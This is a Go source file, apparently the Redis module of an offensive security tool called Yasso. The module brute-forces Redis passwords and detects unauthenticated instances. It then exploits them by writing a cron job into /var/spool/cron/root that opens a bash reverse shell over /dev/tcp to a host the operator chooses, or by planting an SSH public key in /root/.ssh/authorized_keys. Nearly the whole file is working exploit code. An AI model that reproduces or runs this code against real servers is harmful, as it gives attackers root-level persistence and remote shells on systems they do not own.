package cmd

// redis 6379 端口
import (
	"Yasso/config"
	"bufio"
	"errors"
	"fmt"
	"github.com/spf13/cobra"
	"net"
	"os"
	"strings"
	"time"
)

var RedisCmd = &cobra.Command{
	Use:   "redis",
	Short: "Redis burst and Redis extend tools (support proxy)",
	Run: func(cmd *cobra.Command, args []string) {
		if Hosts == "" && ConnHost == "" {
			_ = cmd.Help()
		} else {
			BruteRedisByUser()
		}
	},
}
var (
	RemoteHost      string
	RemotePublicKey string
)

func init() {
	RedisCmd.Flags().StringVar(&RemotePublicKey, "rekey", "", "Write public key to Redis (eg.) id_rsa.pub")
	RedisCmd.Flags().StringVar(&RemoteHost, "rebound", "", "Rebound shell address (eg.) 192.168.1.1:4444")
	RedisCmd.Flags().StringVar(&ConnHost, "hostname", "", "Redis will connect this address")
	RedisCmd.Flags().StringVar(&LoginPass, "pass", "", "set login pass")
	RedisCmd.Flags().StringVar(&SQLCommand, "sql", "", "Execute redis sql command")
}

func BruteRedisByUser() {
	if BrutePort == 0 {
		BrutePort = 6379
	}
	var ips []string
	var err error
	if Hosts != "" && ConnHost == "" {
		ips, err = ResolveIPS(Hosts)
		if err != nil {
			Println(fmt.Sprintf("resolve hosts address failed %v", err))
			return
		}
		if BruteFlag == true {
			users, pass := ReadTextToDic("redis", UserDic, PassDic)
			Println(Clearln + "[*] Brute Module [redis]")
			Println(Clearln + "[*] Redis Authorized crack")
			Println(fmt.Sprintf(Clearln+"[*] Have [user:%v] [pass:%v] [request:%v]", len(users), len(pass), len(users)*len(pass)*len(ips)))
			SwitchBurp("redis", users, pass, ips, BrutePort, Runtime, TimeDuration, "")
		} else {
			Println(Clearln + "[*] May be you want to brute? try to add --crack")
		}
	}
	if Hosts == "" && ConnHost != "" && (RemoteHost != "" || RemotePublicKey != "" || SQLCommand != "") {
		var (
			conn   net.Conn
			status bool
			err    error
		)
		if LoginPass != "" {
			conn, status, err = RedisAuthConn(config.HostIn{Host: ConnHost, Port: BrutePort, TimeOut: TimeDuration}, "", LoginPass)
			if err != nil {
				Println(fmt.Sprintf("Redis Auth failed %v", err))
			}
		} else {
			conn, status, err = RedisUnAuthConn(config.HostIn{Host: ConnHost, Port: BrutePort, TimeOut: TimeDuration}, "", LoginPass)
			if err != nil {
				Println(fmt.Sprintf("Redis UnAuth failed %v", err))
			}
		}
		if SQLCommand != "" {
			RedisExec(conn, SQLCommand)
			return
		}
		if status == true {
			RedisExploit(conn, RemoteHost, RemotePublicKey)
		}
	} else {
		Println("[*] May be your want use redis extend ? Try to add --rekey or --rebound")
	}
}

// redis config

type RedisConfig struct {
	OS         string
	PID        string
	ConfigPath string
	Version    string
	DbFileName string
}

func RedisAuthConn(info config.HostIn, user, pass string) (net.Conn, bool, error) {
	var flag = false
	conn, err := GetConn(fmt.Sprintf("%s:%v", info.Host, info.Port), info.TimeOut)
	if err != nil {
		return conn, false, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)))
	if err != nil {
		return conn, false, err
	}
	// 认证
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return conn, false, err
	}
	reply, err := RedisReply(conn)
	if err != nil {
		return conn, false, err
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		conf := RedisInfo(conn, reply)
		Println(fmt.Sprintf(Clearln+"[+] Redis %s:%v Login Success os:[%v] path:[%v] dbfilename:[%v] pid:[%v]", info.Host, info.Port, conf.OS, conf.ConfigPath, conf.DbFileName, conf.PID))
	}
	return conn, flag, nil
}

func RedisUnAuthConn(info config.HostIn, user, pass string) (net.Conn, bool, error) {
	_, _ = user, pass
	var flag = false
	conn, err := GetConn(fmt.Sprintf("%s:%v", info.Host, info.Port), info.TimeOut)
	if err != nil {
		return conn, false, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)))
	if err != nil {
		return conn, false, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return conn, false, err
	}
	reply, err := RedisReply(conn)
	if err != nil {
		return conn, false, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		conf := RedisInfo(conn, reply)
		Println(fmt.Sprintf(Clearln+"[+] Redis %s:%v unauthorized\n[+] os:[%v] path:[%v] dbfilename:[%v] pid:[%v]", info.Host, info.Port, conf.OS, conf.ConfigPath, conf.DbFileName, conf.PID))
	}
	return conn, flag, nil
}

func RedisReply(conn net.Conn) (string, error) {
	var (
		r   string
		err error
	)
	buf := make([]byte, 5*1024)
	for {
		count, err := conn.Read(buf)
		if err != nil {
			break
		}
		r += string(buf[0:count])
		if count < 5*1024 {
			break
		}
	}
	return r, err
}

// redis get info

func RedisInfo(conn net.Conn, reply string) RedisConfig {
	var (
		// 第0个是#Server
		version    = strings.Split(strings.Split(reply, "\r\n")[2], ":")[1]  // redis version
		os         = strings.Split(strings.Split(reply, "\r\n")[7], ":")[1]  // os
		pid        = strings.Split(strings.Split(reply, "\r\n")[11], ":")[1] // redis pid
		install    = strings.Split(strings.Split(reply, "\r\n")[18], ":")[1]
		dbfilename string
	)
	// 读取filename
	_, err := conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
	if err != nil {
		return RedisConfig{}
	}
	text, err := RedisReply(conn)
	if err != nil {
		return RedisConfig{}
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}

	var redisConfig = RedisConfig{
		Version:    version,
		OS:         os,
		PID:        pid,
		ConfigPath: install,
		DbFileName: dbfilename,
	}
	//Println()(redisConfig)
	return redisConfig
}

// 测试利用写入是否可用

func RedisWrite(conn net.Conn) (cron bool, ssh bool, err error) {
	var reply string
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n"))) // 测试公钥写入
	if err != nil {
		return false, false, err
	}
	reply, err = RedisReply(conn)
	if err != nil {
		return false, false, err
	}
	if strings.Contains(reply, "OK") {
		ssh = true
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n"))) // 测试定时计划写入
	if err != nil {
		return false, ssh, err
	}
	reply, err = RedisReply(conn)
	if err != nil {
		return false, ssh, err
	}
	if strings.Contains(reply, "OK") {
		cron = true
	}
	return cron, ssh, nil
}

// 计划任务写入

func RedisExploit(conn net.Conn, RemoteHost string, Filename string) {
	// 测试写入
	cron, ssh, err := RedisWrite(conn)
	// 上述返回3个值，返回c,s,e,c是corn的值，s是ssh写入，e是err
	if err != nil {
		Println(fmt.Sprintf("Redis Write Testing failed %v", err))
		return
	}
	var (
		status bool
	)
	if RemoteHost != "" && cron == true {
		status, err = RedisCron(conn, RemoteHost)
		if status == true {
			Println("[+] Write Rebound shell address Success")
			return
		} else {
			Println("[x] Redis Write Rebound shell address failed")
			return
		}
	}
	if Filename != "" && ssh == true {
		status, err = RedisKey(conn, Filename)
		if status == true {
			Println("[+] Write ssh key Success")
			return
		} else {
			Println("[x] Redis ssh key failed")
			return
		}
	}
}

func RedisExec(conn net.Conn, cmd string) {
	if cmd != "" {
		_, err := conn.Write([]byte(fmt.Sprintf("%s\r\n", cmd)))
		if err != nil {
			Println(fmt.Sprintf("[!] %v", err))
			return
		}
		reply, err := RedisReply(conn)
		if err != nil {
			Println(fmt.Sprintf("[!] %v", err))
			return
		}
		Println(fmt.Sprintf("%v", string(reply)))
	}
}

func RedisCron(conn net.Conn, RemoteHost string) (bool, error) {
	c, s, _ := RedisWrite(conn)
	Println(fmt.Sprintf("[+] Redis cron %v ssh %v", c, s))
	// 先解析RemoteHost参数
	var (
		remote = strings.Split(RemoteHost, ":")
		flag   = false
		reply  string
		host   string
		port   string
	)
	if len(remote) == 2 {
		host, port = remote[0], remote[1]
	} else {
		return false, errors.New("remote host address is not like 192.160.1.1:4444")
	}
	_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	if err != nil {
		return false, err
	}
	reply, err = RedisReply(conn)
	if err != nil {
		return false, err
	}
	if strings.Contains(reply, "+OK") { // redis可写定时计划任务
		// 存在定时计划写入
		_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
		if err != nil {
			return false, err
		}
		reply, err = RedisReply(conn)
		if err != nil {
			return false, err
		}
		// 数据库设置成功
		if strings.Contains(reply, "+OK") {
			// 写入定时计划任务
			_, err = conn.Write([]byte(fmt.Sprintf("set corn \"\\n*/1 * * * * /bin/bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", host, port)))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "+OK") {
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return false, err
				}
				reply, err = RedisReply(conn)
				if err != nil {
					return false, err
				}
				if strings.Contains(reply, "OK") {
					Println("[+] save corn success")
					flag = true
				}
			}
			// 恢复原始的dbfilename
			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "OK") {
				Println("[+] Restore the original dbfilename")
			}
		}
	}
	return flag, nil
}

// 公钥写入

func RedisKey(conn net.Conn, filename string) (bool, error) {
	var flag = false
	_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	if err != nil {
		return false, err
	}
	reply, err := RedisReply(conn)
	if err != nil {
		return false, err
	}
	if strings.Contains(reply, "OK") {
		_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
		if err != nil {
			return false, err
		}
		reply, err := RedisReply(conn)
		if err != nil {
			return false, err
		}
		if strings.Contains(reply, "OK") {
			key, err := ReadKeyFile(filename)
			if err != nil {
				return false, err
			}
			if len(key) == 0 {
				return false, errors.New(fmt.Sprintf("the keyfile %s is empty", filename))
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "OK") {
				// 保存
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return false, err
				}
				reply, err = RedisReply(conn)
				if err != nil {
					return false, err
				}
				if strings.Contains(reply, "OK") {
					flag = true
				}
			}
			// 恢复原始的dbfilename
			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "OK") {
				Println("[+] Restore the original dbfilename")
			}
		}
	}
	return flag, nil
}

func ReadKeyFile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}
